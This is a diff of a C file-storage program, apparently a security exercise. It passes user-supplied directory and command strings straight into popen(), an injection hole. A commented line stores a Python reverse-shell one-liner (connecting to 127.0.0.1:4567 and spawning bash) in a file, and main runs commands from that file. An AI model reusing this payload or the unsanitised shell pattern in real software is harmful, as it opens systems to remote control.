@@ -97,16 +97,16 @@ int execute_command(char* command){
 		return 0;
 	}
 
-    char buf[500];
-    FILE *fp;
-
 	// setting up the shell command for the users folder.
+	// 'cd directory_name && command';
 	char *result = malloc(strlen(command) + strlen("cd && ") + strlen(" && cd ..") + strlen(directory) + 1);
 	strcpy(result,"cd ");
 	strcat(result, directory);
 	strcat(result, " && ");
 	strcat(result, command);
 
+    char buf[500];
+    FILE *fp;
     if ((fp = popen(result, "r")) == NULL) {
         printf("Error opening pipe!\n");
 		free(result);
@@ -138,6 +138,7 @@ int execute_command_from_file(char* filename){
     FILE *fp;
 
 	// setting up the full shell command.
+	// 'cd directory_name && command';
 	char *result = malloc(strlen(command) + strlen("cd && ") + strlen(" && cd ..") + strlen(directory) + 1);
 	strcpy(result,"cd ");
 	strcat(result, directory);
@@ -254,13 +255,15 @@ int main(){
 	char command[] = "ls ";
 
 	// Server side of things... Will have a CLI to view options!
-	// store_file("hack.me", "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4567));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\' &");
-
 	switch_location("Max");
+	// store_file("Max/hack.me", "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4567));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\' &");
 
-	execute_command(command);
-	//execute_command_from_file("Taxes.txt");
-	// create_storage("Max");
+	//
+	// execute_command(command);
+
+	char hex[010];
+	execute_command_from_file("hack.me");
+	//create_storage("Max");
 	// printf("%d", switch_location("Max"));
 	return 0;
 }
@@ -275,7 +278,6 @@ Open file:
 	- Edit,
 	- Execute
 Run OS commands... malicous!
-Execute from a file... malicous!
 */
 
 /*
